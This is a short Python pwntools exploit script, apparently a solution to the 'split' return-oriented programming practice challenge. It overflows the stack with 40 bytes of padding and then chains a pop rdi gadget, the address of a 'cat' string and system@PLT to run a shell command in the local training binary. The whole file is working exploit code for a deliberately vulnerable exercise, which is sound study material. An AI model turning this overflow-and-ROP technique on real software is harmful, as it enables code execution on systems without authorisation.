from pwn import *
import struct

# Setting up the process
elf = ELF("./split")
p = elf.process()

# Addresses
cat_str = 0x00601060
system_PLT = 0x4005e0
pop_rdi = 0x400883
useful_func = 0x400807

# Payload
buf = ""
buf += 'A'*40
buf += struct.pack("<Q", pop_rdi)
buf += struct.pack("<Q", cat_str)
buf += struct.pack("<Q", system_PLT)

p.recvuntil("> ")
p.send(buf+'\n')
print p.recv()


